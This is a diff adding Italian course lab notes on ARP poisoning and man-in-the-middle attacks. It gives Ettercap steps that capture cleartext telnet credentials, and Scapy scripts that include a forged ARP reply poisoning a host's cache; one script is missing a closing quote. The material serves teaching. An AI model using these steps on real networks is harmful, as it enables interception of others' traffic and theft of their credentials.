@@ -98,5 +98,137 @@ Il MAC flooding fa uso di questa limitazione per inviare allo swich un intero gr
 - L'attaccante può vedere tutti i frame inviati da un host vittima a un altro host senza una voce nella tabella degli indirizzi MAC
 I tool di attacco alla rete generarno circa 160000 voci MAC su uno switch al minuto
 
+# Attacchi ARP
+
+## Ripasso
+
+### Frame Ethernet
+![Frame Ethernet](/assets/sicurezza_informatica/frame-ethernet.png)<br>
+Questo è il frame che solitamente esce dalla scheda di rete, composto da Source and Destination MAC Address (Source associato alla scheda di rete che effettua la richiesta)<br>
+Quando dobbiamo generare un pacchetto ma non sappiamo il MAC Address di destinazione, scatta una rischiesta ARP
+
+### ARP
+Contribuisce a creare all'interno di una tabella l'associazione tra singolo host e MAC Address (questo IP x è associato a questo MAC Address y).<br>
+
+![ARP Formato del Messaggio](/assets/sicurezza_informatica/arp-message-format.png)<br>
+
+## ARP Poisoning and MITM
+![Schema](/assets/sicurezza_informatica/arp-poisoning-mitm.png)<br>
+Attaccante si intromette tra Jhon e Linda
+- Jhon ha MAC b
+- Linda ha MAC a
+- Attaccante ha MAC c
+  - L'attaccante cambia la cache locale di Jhon dicendo che Linda ha MAC c
+  - L'attaccante cambia la cache locale di Linda dicendo che John ha MAC c
+- I pacchetti che Jhon e Linda pensano di scambiarsi in realtà vanno tutti all'attaccante (che poi può inoltrare ai rispettivi destinatari)
+
+Utilizzeremo:
+- Python : per creare il pacchetto 
+- Ettercap tool : security tool per attacchi man-in-the-middle
+  - simile a wireshark ma più limitato
+
+## Pre Esercizio
+- Macchina A : .4
+- Macchina B : .6
+- Macchina C : .5 
+
+A e B si parlano e C sta in mezzo
+
+### Test
+- Macchina C avvia wireshark 
+- Macchina A pinga la C
+- In wireshark vedremo una richiesta ARP
+  - opcode 1 richiesta
+  - sender MAC : il MAC di A
+  - sender IP : l'IP di A
+  - target MAC : 00:00:00:00:00 (perché il MAC non lo conosco)
+  - Target IP : l'IP di C 
+- Subito dopo vedremo una reply da parte della macchina C 
+  - Dove risponde con il MAC address in quanto la macchina A stava cercando l'IP di C
+- Sia nella macchina A che nella macchina C vedremo l'associazione MAC e IP di C o di A, se facciamo un 
+```bash
+arp -a
+``` 
+- Cancellare le entry nella cache ARP appena create (di entrambe le macchine)
+ ```bash
+sudo arp -d <INDIRIZZO IP 1>
+``` 
+
+## Esercizio
+Installazione di ettercap sulla macchina C
+```bash
+sudo apt-get install ettercap-common
+``` 
+Avvia l'app Ettercap
+- "Sniff" -> "Unified Sniffing" -> Selezione interfaccia di rete
+- "Host" -> "Scan for host" -> ci permette di vedere la lista di host disponibili nella sottorete
+- "Target" -> Mettiamo le due macchine che vogliamo attaccare (quindi Macchina A e Macchina B)
+- "MITM" -> "ARP Poisoning" -> "Sniff remote connection" 
+- Se ora faccio il solito comando arp -a su A e B vedremo che è stata inserita la macchina C nella cache table MA nel caso di arp -a su macchina A vedremo la macchina C e B con lo stesso MAC Address, viceversa su macchina B vedremo la macchina C e A con lo stesso MAC Address (in entrambi i casi il MAC dell'attaccante)
+- telnet da macchina A a macchina B
+```bash
+telnet <INDIRIZZO IP 1>
+``` 
+- Ettercap interecetterà il comando dato con username e password : TELNET : <indirizzo IP 1>:\<PORT> -> USER: \<username in chiaro>  PASS: \<password in chiaro> 
+- Con Wireshark attivo vedremo una serie di richieste/reply ARP malformato inviate per ingannare A e B
+
+## Creare pachetti con Python
+arcode.py : 
+```python
+#!/usr/bin/python3
+from scapy.all import *
+E = Ether( dst = 'destMAC', src = 'srcMAC')
+A = ARP( hwsrc = 'srcMAC', psrc = 'srcIP', hwdst = 'dstMAC', pdst = 'dstIP' )
+pkt = E/A
+pkt.show()
+sendp(pkt)
+``` 
+- Riga 2 : Libreria scapy ci permette di creare pacchetti
+- Riga 3 : Creo un nuovo frame Ethernet passando il MAC di destinazione e il MAC sorgente (dst se messo a ff = lo mando in broadcast)
+- Riga 4 : Creo una nuova richiesta ARP passando, come visto in precedenza, MAC sorgente, IP sorgente, MAC destinatario (può anche essere vuoto), IP destinatario
+- Riga 5 : Creo il pacchetto che è dato dall'incapsulamento di E su A
+- Riga 6 : Stampo il pacchetto a video per un controllo
+- Riga 7 : Invio il pacchetto
+
+```bash
+sudo python arpcode.py
+``` 
+-Su wireshark vedremo la richiesta ARP contente il pacchetto che abbiamo appena inviato
+
+### Esempi con Python
+
+#### Esempio 1
+Io sono la macchina .5 voglio chiedere il MAC della macchina .4
+```python
+#!/usr/bin/python3
+from scapy.all import *
+E = Ether( dst = 'ff:ff:ff:ff:ff:ff', src = 'MAC macchina .5')
+A = ARP( hwsrc = 'MAC della macchina .5', psrc = 'IP.5', hwdst = '00:00:00:00:00:00', pdst = 'IP.4' )
+pkt = E/A
+pkt.show()
+sendp(pkt)
+``` 
+- Pulisco la cache table delle macchine
+- Lancio il pacchetto
+- Su wireshark troviamo la richiesta ARP con la risposta ARP che contiene il MAC Address di .4
+
+#### Esempio 2
+Vogliamo creare pacchetto di risposta della macchina .4 che dice che alla macchina .6 che il suo indirizzo (della macchina .4) è quello dell'attaccante (della macchina .5)
+
+```python
+#!/usr/bin/python3
+from scapy.all import *
+E = Ether( dst = 'MAC macchina .6', src = 'MAC della macchina .5)
+A = ARP( op=2, hwsrc = 'MAC della macchina .5', psrc = 'IP.4', hwdst = 'MAC macchina .6', pdst = 'IP.6' )
+pkt = E/A
+pkt.show()
+sendp(pkt)
+``` 
+- op=2 : usato per dire che è una reply
+- una volta spedito ha avvelenato la cahce della macchina .6 dato che nella sua arp table vedrà l'associazione tra IP .4 e MAC Add .5
+
+
+
+
 
 
